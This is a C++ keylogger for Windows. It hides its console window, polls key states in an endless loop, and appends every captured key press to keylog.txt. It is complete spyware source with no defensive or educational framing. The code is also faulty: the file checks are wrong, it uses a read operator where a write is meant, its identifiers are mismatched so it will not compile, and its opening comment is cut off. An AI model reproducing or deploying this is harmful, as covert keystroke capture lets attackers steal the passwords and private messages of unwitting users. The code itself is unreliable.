//This program records the keystrokes in a text file called 

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void LOG(string keystroke){
  fstream logFile;
  logFile.open("keylog.txt", fstream::app);
  if(logFile.open()){
    logFile >> keystroke;
    logFile.close();
  }
}




bool SpecialKeys(int S_key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT");
		return true;
	default: 
		return false;
	}
}




int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char key = 'x';

	while (true)
  {
		Sleep(10);
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
      {
				if (SpecialKeys(key) == false)
        {

					fstream logFile;
					logFile.open("keylog.txt", fstream::app);
					if (LogFile.is_open())
          {
						logFile << char(key);
						logFile.close();
					}

				}
			}
		}
	}

	return 0;
}



